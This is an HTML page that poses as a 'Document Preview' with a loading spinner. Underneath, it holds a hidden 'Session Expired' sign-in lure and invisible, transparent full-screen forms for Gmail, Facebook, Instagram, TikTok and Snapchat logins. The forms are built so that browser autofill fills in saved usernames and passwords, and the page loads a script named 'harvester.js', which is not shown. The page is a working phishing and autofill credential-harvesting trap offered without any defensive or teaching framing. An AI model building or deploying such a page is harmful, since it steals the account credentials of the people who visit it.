<!DOCTYPE html>
<html>
<head>
  <title>Document Preview</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .preview-container {
      background-color: white;
      padding: 2rem;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
      margin: 0 auto 1rem;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .honeypot-container {
      display: none; /* Hidden by default */
      background-color: white;
      padding: 2rem 1rem;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
      position: relative;
      z-index: 1;
      pointer-events: none; /* Clicks pass through this layer */
    }
    .form-overlay {
        display: none; /* Hidden by default */
        position: absolute;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        opacity: 0; /* Completely transparent */
        z-index: 2; /* Sits on top of the honeypot text */
    }
    .hidden-form {
        display: none;
    }
  </style>
</head>
<body>
  <div class="preview-container">
    <div class="loader"></div>
    <p>Loading document preview...</p>
  </div>

  <div class="honeypot-container">
      <h2>Session Expired</h2>
      <p>Please tap here to sign in again.</p>
  </div>

  <!-- Ghost Overlays -->
  <form id="gmail-form" class="form-overlay">
    <input type="email" name="email" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="facebook-form" class="form-overlay">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="instagram-form" class="form-overlay">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="tiktok-form" class="form-overlay">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="snapchat-form" class="form-overlay">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>

  <script src="harvester.js"></script>

</body>
</html>
